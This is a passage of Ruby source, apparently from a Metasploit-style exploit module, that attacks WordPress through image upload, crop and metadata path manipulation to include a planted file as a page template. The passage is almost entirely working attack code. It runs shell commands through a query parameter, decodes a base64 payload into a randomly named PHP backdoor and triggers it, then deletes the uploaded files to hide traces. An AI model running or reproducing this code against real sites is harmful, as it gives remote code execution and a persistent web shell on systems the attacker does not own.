"     print_status("Uploading payload")     upload_uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'async-upload.php')      res = send_request_cgi(       'method'   => 'POST',       'uri'      => upload_uri,       'ctype'    => "multipart/form-data; boundary=#{boundary}",       'data'     => post_data,       'cookie'   => cookie     )     fail_with(Failure::UnexpectedReply, 'Unable to upload image') unless res && res.code == 200 && res.body && !res.body.empty?     print_good("Image uploaded")     res = JSON.parse(res.body)     image_id = res["data"]["id"]     update_nonce = res["data"]["nonces"]["update"]     filename = res["data"]["filename"]     return filename, image_id, update_nonce   end    def image_editor(img_name, ajax_nonce, image_id, cookie)     uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')     res = send_request_cgi(       'method'    => 'POST',       'uri'       => uri,       'cookie' => cookie,       'vars_post'  => {         'action' => 'image-editor',         '_ajax_nonce' => ajax_nonce,         'postid' => image_id,         'history' => '[{"c":{"x":0,"y":0,"w":400,"h":300}}]',         'target' => 'all',         'context' => '',         'do' => 'save'       }     )     fail_with(Failure::NotFound, 'Unable to access page to retrieve filename') unless res && res.code == 200 && res.body && !res.body.empty?     filename = res.body.scan(/(#{img_name}-\S+)-/).flatten.first     fail_with(Failure::NotFound, 'Unable to retrieve file name') unless filename      filename << '.jpg'   end    def change_path(wpnonce2, image_id, filename, current_date, path, cookie)     uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')     res = send_request_cgi(       'method'   => 'POST',       'uri'      => uri,       'cookie' => cookie,       'vars_post'  => {         '_wpnonce' => wpnonce2,         'action' => 'editpost',         'post_ID' => image_id,         'meta_input[_wp_attached_file]' => "#{current_date}#{filename}#{path}"       }     )   end    def crop_image(image_id, ajax_nonce, cookie)     uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')     res = send_request_cgi(       'method'   => 'POST',       'uri'      => uri,       'cookie' => cookie,       'vars_post'  => {         'action' => 'crop-image',         '_ajax_nonce' => ajax_nonce,         'id' => image_id,         'cropDetails[x1]' => 0,         'cropDetails[y1]' => 0,         'cropDetails[width]' => 400,         'cropDetails[height]' => 300,         'cropDetails[dst_width]' => 400,         'cropDetails[dst_height]' => 300       }     )   end    def include_theme(shell_name, cookie)     uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post-new.php')     res = send_request_cgi(       'method'   => 'POST',       'uri'      => uri,       'cookie' => cookie     )     if res && res.code == 200 && res.body && !res.body.empty?       wpnonce2 = res.body.scan(/name="_wpnonce" value="(\w+)"/).flatten.first       post_id = res.body.scan(/"post":{"id":(\w+),/).flatten.first       fail_with(Failure::NotFound, 'Unable to retrieve the second wpnonce and the post id') unless wpnonce2 && post_id        post_title = Rex::Text.rand_text_alpha(10)       uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')       res = send_request_cgi(         'method'   => 'POST',         'uri'      => uri,         'cookie' => cookie,         'vars_post'  => {           '_wpnonce'=> wpnonce2,           'action' => 'editpost',           'post_ID' => post_id,           'post_title' => post_title,           'post_name' => post_title,           'meta_input[_wp_page_template]' => "cropped-#{shell_name}.jpg"         }       )       fail_with(Failure::NotFound, 'Failed to retrieve post id') unless res && res.code == 302       post_id     end   end    def check_for_base64(cookie, post_id)     uri = normalize_uri(datastore['TARGETURI'])     # Test if base64 is on target     test_string = 'YmFzZTY0c3BvdHRlZAo='     res = send_request_cgi!(       'method'   => 'GET',       'uri'      => uri,       'cookie' => cookie,       'vars_get' => {         'p' => post_id,         '0' => "echo #{test_string} | base64 -d"       }     )     fail_with(Failure::NotFound, 'Unable to retrieve response to base64 command') unless res && res.code == 200 && !res.body.empty?      fail_with(Failure::NotFound, "Can't find base64 decode on target") unless res.body.include?("base64spotted")     # Execute payload with base64 decode     @backdoor = Rex::Text.rand_text_alpha(10)     encoded = Rex::Text.encode_base64(payload.encoded)     res = send_request_cgi!(       'method'   => 'GET',       'uri'      => uri,       'cookie' => cookie,       'vars_get' => {         'p' => post_id,         '0' => "echo #{encoded} | base64 -d > #{@backdoor}.php"       }     )      fail_with(Failure::NotFound, 'Failed to send payload to target') unless res && res.code == 200 && !res.body.empty?     send_request_cgi(       'method'  =>  'GET',       'uri'     =>  normalize_uri(datastore['TARGETURI'], "#{@backdoor}.php"),       'cookie'  =>  cookie     )   end    def wp_cleanup(shell_name, post_id, cookie)     print_status('Attempting to clean up files...')     uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')     res = send_request_cgi(       'method'    => 'POST',       'uri'       => uri,       'cookie'    => cookie,       'vars_post'  => { 'action' => "query-attachments" }     )      fail_with(Failure::NotFound, 'Failed to receive a response for uploaded file') unless res && res.code == 200 && !res.body.empty?     infos = res.body.scan(/id":(\d+),.*filename":"cropped-#{shell_name}".*?"delete":"(\w+)".*"id":(\d+),.*filename":"cropped-x".*?"delete":"(\w+)".*"id":(\d+),.*filename":"#{shell_name}".*?"delete":"(\w+)"/).flatten     id1, id2, id3 = infos[0], infos[2], infos[4]     delete_nonce1, delete_nonce2, delete_nonce3 = infos[1], infos[3], infos[5]     for i in (0...6).step(2)       res = send_request_